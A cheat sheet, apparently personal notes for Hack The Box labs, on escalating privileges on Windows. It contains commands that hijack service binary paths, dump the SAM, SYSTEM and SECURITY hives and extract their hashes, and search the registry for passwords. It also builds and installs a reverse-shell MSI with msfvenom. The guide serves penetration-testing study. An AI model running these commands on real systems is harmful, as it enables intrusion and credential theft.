#htb #windows #priv #previlege-escalation  #guide

## 🔍 1. Basic Enumeration
**Who am I?**
```
whoami
whoami /priv
whoami /groups
echo %USERNAME%
```

**System Info**
```
systeminfo
hostname
wmic os get Caption, Version, BuildNumber, OSArchitecture
```

**Users & Groups**
```
net user
net localgroup
net localgroup administrators
```

**Processes & Services**
```
tasklist /v
sc query
sc queryex type= service state= all
```

**Network**
```
ipconfig /all
netstat -ano
arp -a
```

**Environment**
```
set
echo %PATH%
```

---

## 🛡 2. User Privileges & Tokens
Check your privileges:
```
whoami /priv
```

Interesting ones:
- `SeImpersonatePrivilege`
- `SeAssignPrimaryTokenPrivilege`
- `SeBackupPrivilege`
- `SeRestorePrivilege`
- `SeTakeOwnershipPrivilege`
- `SeDebugPrivilege`

👉 If enabled, you can abuse tools like **JuicyPotato**, **PrintSpoofer**, **RoguePotato**, or **GodPotato** to escalate to SYSTEM.

---

## ⚙️ 3. Misconfigured Services
List services:
```
sc query state= all
wmic service get name,displayname,pathname,startmode
```

Check a specific service:
```
sc qc <service_name>
sc query <service_name>
```

Look for:
- `SERVICE_START_NAME: LocalSystem`
- Writable binary path or parameters
- Unquoted service paths

Exploit:
```
sc config <service_name> binPath= "C:\path\malicious.exe"
sc start <service_name>
```

---

## 🎯 4. Unquoted Service Paths
Check for unquoted paths with spaces:
```
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\" | findstr /i " "
```

Example vulnerable path:
```
C:\Program Files\Some Service\service.exe
```
If user can write to `C:\Program Files\Some.exe`, drop malicious exe → executed as SYSTEM.

---

## ⏰ 5. Scheduled Tasks
Check tasks:
```
schtasks /query /fo LIST /v
```
If task runs with SYSTEM and points to writable file → replace file with payload.

---

## 🔑 6. Stored Credentials
Check stored credentials:
```
cmdkey /list
```
Reuse with:
```
runas /savecred /user:Administrator cmd
```

Registry search:
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Config files:
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\System32\Sysprep\Sysprep.xml`
- `C:\inetpub\wwwroot\web.config`

---

## 🗃 7. SAM & SYSTEM Files
If accessible:
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
```
Dump with:
```
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
```
Extract hashes:
```
secretsdump.py -sam sam -system system LOCAL
```

---

## 📦 8. DLL Hijacking
If service loads missing DLL from writable directory → place malicious DLL.

Check with ProcMon (filter for "NAME NOT FOUND").

---

## 🖥 9. Kernel Exploits
Check OS version:
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```
Match build number against public exploits (Exploit-DB, MSF modules).

Examples:
- EternalBlue (MS17-010)
- PrintNightmare (CVE-2021-34527)
- Token privilege escalation bugs

⚠️ Usually patched in HTB, but check on older boxes.

---

## 🧩 10. Registry Permissions
Check if you can modify service config in registry:
```
reg query HKLM\SYSTEM\CurrentControlSet\Services /s
```
If writable → change ImagePath to your payload.

---

## 🛠 11. Always Install Elevated
Check registry keys:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If both are 1 → you can run any MSI as SYSTEM:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 🔄 12. Abusing Binaries (LOLbins)
Many Windows binaries can be abused for escalation:
- `msiexec.exe`
- `installutil.exe`
- `regsvr32.exe`
- `rundll32.exe`
- `certutil.exe`

Reference: [LOLBAS Project](https://lolbas-project.github.io/)

---

## 🔐 13. LSA Secrets
Dump cached credentials:
```
reg save HKLM\SECURITY security
reg save HKLM\SYSTEM system
secretsdump.py -security security -system system LOCAL
```

---

## 🧵 14. Impersonation & Token Abuse
If `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is enabled:
- JuicyPotato
- RoguePotato
- PrintSpoofer
- GodPotato

Exploit example (PrintSpoofer):
```
PrintSpoofer64.exe -i -c cmd
```

---

## 📊 15. Automation Tools
- **winPEAS.exe** → full privesc enumeration
- **Seatbelt.exe** → in-depth system checks
- **PowerUp.ps1** → PowerShell privesc checks
- **PrivescCheck.ps1** → checks registry, services, scheduled tasks
- **SharpUp.exe** → C# version of PowerUp

Run:
```
winPEAS.exe > output.txt
```

---

# 🧠 Workflow (HTB Labs)
1. **Initial enum** → `whoami /priv`, `systeminfo`, `net user`, `sc qc`, `schtasks`, `cmdkey /list`
2. **Check privileges** → if `SeImpersonatePrivilege` → Potato exploit
3. **Check services** → misconfig, unquoted paths, writable bin
4. **Check scheduled tasks** → replace scripts
5. **Search for creds** → registry, config files, unattended.xml
6. **Dump hashes** → SAM + SYSTEM if readable
7. **Try AlwaysInstallElevated** → MSI exploitation
8. **Run automation tools** → winPEAS, PowerUp, Seatbelt
9. **If nothing** → kernel exploit based on `systeminfo`
10. **Escalate → SYSTEM → document path**
